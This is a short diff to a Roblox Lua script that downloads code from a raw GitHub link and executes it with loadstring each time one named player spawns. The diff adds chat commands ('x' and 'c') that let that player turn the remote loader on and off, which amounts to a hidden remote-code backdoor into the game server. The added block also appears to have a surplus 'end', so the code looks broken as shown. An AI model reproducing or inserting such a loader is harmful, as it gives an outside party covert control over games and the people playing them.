@@ -2,8 +2,21 @@
 local http = game:GetService("HttpService")
 
 
+
 local link = "https://raw.githubusercontent.com/balljeet/balljeet-documents/main/z"
+local var = true
+game.Players.staandz.Chatted:Connect(function(msg)
+if msg == "x" then
+var = true
+elseif msg == "c" then
+var = false
+end
+end
+
+end)
 game.Players.staandz.CharacterAdded:Connect(function()
 wait(2)
+if var then
 loadstring(http:GetAsync(link))()
+end
 end)
